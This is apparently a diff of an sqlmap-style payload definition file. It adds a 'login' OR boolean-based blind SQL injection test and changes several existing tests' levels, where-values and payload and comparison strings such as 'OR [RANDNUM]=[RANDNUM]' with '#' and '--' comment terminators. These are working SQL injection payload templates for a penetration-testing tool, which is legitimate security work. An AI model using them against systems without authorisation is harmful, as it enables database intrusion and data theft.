@@ -411,9 +411,25 @@ Formats:
     </test>
 
     <test>
+       <title>OR boolean-based blind - WHERE clause (login)</title>
+       <stype>1</stype>
+       <level>2</level>
+       <risk>3</risk>
+       <clause>1</clause>
+       <where>1</where>
+       <request>
+           <payload>OR [RANDNUM]=[RANDNUM]</payload>
+           <comment>#</comment>
+       </request>
+       <response>
+           <comparison>AND [RANDNUM]=[RANDNUM1]</comparison>
+       </response>
+   </test>
+
+   <test>
         <title>OR boolean-based blind - WHERE clause</title>
         <stype>1</stype>
-        <level>3</level>
+        <level>4</level>
         <risk>3</risk>
         <clause>1</clause>
         <where>2</where>
@@ -428,16 +444,16 @@ Formats:
     <test>
         <title>OR boolean-based blind - WHERE clause</title>
         <stype>1</stype>
-        <level>3</level>
+        <level>4</level>
         <risk>3</risk>
         <clause>1</clause>
-        <where>1</where>
+        <where>2</where>
         <request>
-            <payload>OR [RANDNUM]=[RANDNUM]</payload>
+            <payload>OR [RANDNUM]=[RANDNUM1]</payload>
             <comment>#</comment>
         </request>
         <response>
-            <comparison>OR [RANDNUM]=[RANDNUM1]</comparison>
+            <comparison>OR [RANDNUM]=[RANDNUM]</comparison>
         </response>
         <details>
             <dbms>MySQL</dbms>
@@ -450,13 +466,13 @@ Formats:
         <level>3</level>
         <risk>3</risk>
         <clause>1</clause>
-        <where>1</where>
+        <where>2</where>
         <request>
-            <payload>OR [RANDNUM]=[RANDNUM]</payload>
+            <payload>OR [RANDNUM]=[RANDNUM1]</payload>
             <comment>--</comment>
         </request>
         <response>
-            <comparison>OR [RANDNUM]=[RANDNUM1]</comparison>
+            <comparison>OR [RANDNUM]=[RANDNUM]</comparison>
         </response>
     </test>
     <!-- End of boolean-based blind tests - WHERE clause -->
